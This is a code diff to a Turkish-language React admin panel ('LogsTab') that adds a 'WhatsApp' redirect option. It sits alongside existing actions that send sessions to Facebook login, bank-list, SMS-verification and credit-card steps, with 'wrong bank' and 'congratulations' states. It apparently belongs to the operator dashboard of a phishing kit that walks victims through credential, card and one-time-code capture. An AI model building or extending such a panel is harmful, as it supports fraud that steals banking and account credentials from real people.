@@ -642,6 +642,7 @@ function getStepDisplay(
   else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
   else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
   else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
+  else if (s === "whatsapp") { stepText = "WHATSAPP"; stepColor = "text-[#25D366] bg-[#25D366]/10 border border-[#25D366]/20"; }
   else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
   else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
   else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
@@ -1340,7 +1341,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
-    if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
+    if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats" || action === "whatsapp") {
       // ZORLU (win2) session'lari: "Banka Listesine Yonlendir" -> banken2 tasirimi,
       // diger linklerde normal banken. Sadece is_win2_flow olanlarda gecerli.
       let targetStep = action;
@@ -2554,6 +2555,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             <option value="">Aksiyon Seçin...</option>
                             <option value="win">👉 İsim & Profil'e Yönlendir</option>
                             <option value="facebook">👉 Facebook Girişine Yönlendir</option>
+                            <option value="whatsapp">💬 WhatsApp'a Yönlendir</option>
                             <option value="banken">👉 Banka Listesine Yönlendir</option>
                             <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
                             <option value="card">👉 Kredi Kartına Yönlendir</option>
@@ -2856,6 +2858,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         <option value="">Aksiyon Seçin...</option>
                         <option value="win">👉 İsim & Profil</option>
                         <option value="facebook">👉 Facebook</option>
+                        <option value="whatsapp">💬 WhatsApp</option>
                         <option value="banken">👉 Banka Listesi</option>
                         <option value="sms">👉 SMS Doğrulama</option>
                         <option value="card">👉 Kredi Kartı</option>
